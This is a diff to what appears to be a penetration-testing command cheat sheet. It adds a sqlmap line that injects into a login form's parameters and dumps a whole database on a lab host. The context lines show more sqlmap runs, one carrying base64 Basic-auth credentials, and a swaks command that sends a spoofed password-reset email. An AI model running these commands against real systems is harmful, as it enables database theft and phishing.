@@ -686,6 +686,7 @@ sqlmap -u 'http://example.com/?username=admin' --dbs --level 4 --risk 3 --file-w
 sqlmap -u 'http://10.10.110.124/login.php?username=admin&password=admin' --dbs --batch --level 4 --risk 3
 # with Basic Authentication
 sqlmap -u 'http://10.10.110.124/login' --form --dbs --batch --level 4 --risk 3 --headers="Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
+sqlmap --url 'http://10.10.45.118/login' --method=POST --data="username=admin&password=admin" -p "username,password" --risk=3 --level=3 --random-agent -D sqhell_2 --dump-all --threads 10
 
 [swaks]
 swaks --to admin@openmailbox.xyz --from david@openmailbox.xyz --header 'Subject: RESET MY PASSWORD 201324' --body 'Please reset my password' --server openmailbox.xyz
